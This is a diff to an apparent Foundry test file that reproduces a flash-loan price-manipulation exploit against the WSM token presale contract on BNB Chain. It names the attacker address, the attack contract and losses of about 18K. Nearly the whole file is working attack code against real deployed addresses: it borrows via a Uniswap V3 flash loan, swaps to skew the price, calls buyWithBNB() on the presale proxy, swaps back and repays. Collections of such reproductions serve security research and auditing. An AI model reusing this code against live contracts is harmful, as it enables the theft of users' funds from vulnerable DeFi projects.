@@ -3,6 +3,11 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
+import {IUniswapV3Router} from "src/interfaces/IUniswapV3Router.sol";
+import {IWBNB} from "src/interfaces/IWBNB.sol";
+
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 // @KeyInfo - Total Lost : 2_517_438_179_912_631_607_253_979 WSM ≈ 18K
 // Attacker : 0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32
 // Attack Contract : https://bscscan.com/address/0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3
@@ -15,10 +20,18 @@ import "forge-std/Test.sol";
 // and then manipulating the price through the buyWithBNB() in the presale contract.
 
 contract WSM is Test {
-
-    IUniswapV3Pair BNB_WSH_10000 = IUniswapV3Pair(payable(address(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E)));
-    IUniswapV3Router routerv3_ = IUniswapV3Router(payable(address(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18)));
-    IUniswapV3Pair BNB_WSH_3000 = IUniswapV3Pair(payable(address(0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a)));
+    IUniswapV3Pair BNB_WSH_10000 =
+        IUniswapV3Pair(
+            payable(address(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E))
+        );
+    IUniswapV3Router routerv3_ =
+        IUniswapV3Router(
+            payable(address(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18))
+        );
+    IUniswapV3Pair BNB_WSH_3000 =
+        IUniswapV3Pair(
+            payable(address(0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a))
+        );
     address proxy_ = address(0xFB071837728455c581f370704b225ac9eABDfa4a);
 
     IERC20 wshToken_;
@@ -35,44 +48,71 @@ contract WSM is Test {
     }
 
     function testExploit() public {
-        console.log("1. before attack wsh token balance of this = ", wshToken_.balanceOf(address(this)));
+        console.log(
+            "1. before attack wsh token balance of this = ",
+            wshToken_.balanceOf(address(this))
+        );
         BNB_WSH_10000.flash(address(this), 5_000_000 ether, 0, "");
-        console.log("8. after attack wsh token balance of this = ", wshToken_.balanceOf(address(this)));
+        console.log(
+            "8. after attack wsh token balance of this = ",
+            wshToken_.balanceOf(address(this))
+        );
     }
 
-    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
-        console.log("2. bnb_wsh_10000 pool wsh balance after flashloan = ", wshToken_.balanceOf(address(this)));
+    function uniswapV3FlashCallback(
+        uint256 fee0,
+        uint256 fee1,
+        bytes calldata data
+    ) public {
+        console.log(
+            "2. bnb_wsh_10000 pool wsh balance after flashloan = ",
+            wshToken_.balanceOf(address(this))
+        );
 
-        IUniswapV3Router.ExactInputSingleParams memory args = IUniswapV3Router.ExactInputSingleParams({
-            tokenIn: address(wshToken_),
-            tokenOut: address(bnbToken_),
-            fee: 3000,
-            recipient: address(this),
-            deadline: block.timestamp,
-            amountIn: 5_000_000 ether,
-            amountOutMinimum: 1,
-            sqrtPriceLimitX96: 0
-        });
+        IUniswapV3Router.ExactInputSingleParams memory args = IUniswapV3Router
+            .ExactInputSingleParams({
+                tokenIn: address(wshToken_),
+                tokenOut: address(bnbToken_),
+                fee: 3000,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: 5_000_000 ether,
+                amountOutMinimum: 1,
+                sqrtPriceLimitX96: 0
+            });
         routerv3_.exactInputSingle(args);
 
-        console.log("3. balance after exchanging wsh for bnb = ", bnbToken_.balanceOf(address(this)));
+        console.log(
+            "3. balance after exchanging wsh for bnb = ",
+            bnbToken_.balanceOf(address(this))
+        );
         bnbToken_.withdraw(bnbToken_.balanceOf(address(this)));
 
         console.log("4. [ ============= ATTACK START ============= ]");
-        proxy_.call{value: address(this).balance}(abi.encodeWithSignature("buyWithBNB(uint256,bool)", 2_770_000, false));
-        console.log("5. wsh balance after attack function buyWithBNB() = ", wshToken_.balanceOf(address(this)));
+        (bool success2,) = proxy_.call{value: address(this).balance}(
+            abi.encodeWithSignature(
+                "buyWithBNB(uint256,bool)",
+                2_770_000,
+                false
+            )
+        );
+        console.log(
+            "5. wsh balance after attack function buyWithBNB() = ",
+            wshToken_.balanceOf(address(this))
+        );
         console.log("6. [ ============= ATTACK END ============= ]");
 
-        IUniswapV3Router.ExactInputSingleParams memory args2 = IUniswapV3Router.ExactInputSingleParams({
-            tokenIn: address(bnbToken_),
-            tokenOut: address(wshToken_),
-            fee: 3000,
-            recipient: address(this),
-            deadline: block.timestamp,
-            amountIn: address(this).balance,
-            amountOutMinimum: 1,
-            sqrtPriceLimitX96: 0
-        });
+        IUniswapV3Router.ExactInputSingleParams memory args2 = IUniswapV3Router
+            .ExactInputSingleParams({
+                tokenIn: address(bnbToken_),
+                tokenOut: address(wshToken_),
+                fee: 3000,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: address(this).balance,
+                amountOutMinimum: 1,
+                sqrtPriceLimitX96: 0
+            });
         routerv3_.exactInputSingle{value: address(this).balance}(args2);
 
         console.log("7. repay flashloan for bnb_wsh_10000 pool");
@@ -80,5 +120,5 @@ contract WSM is Test {
     }
 
     fallback() external payable {}
-
+    receive() external payable {}
 }
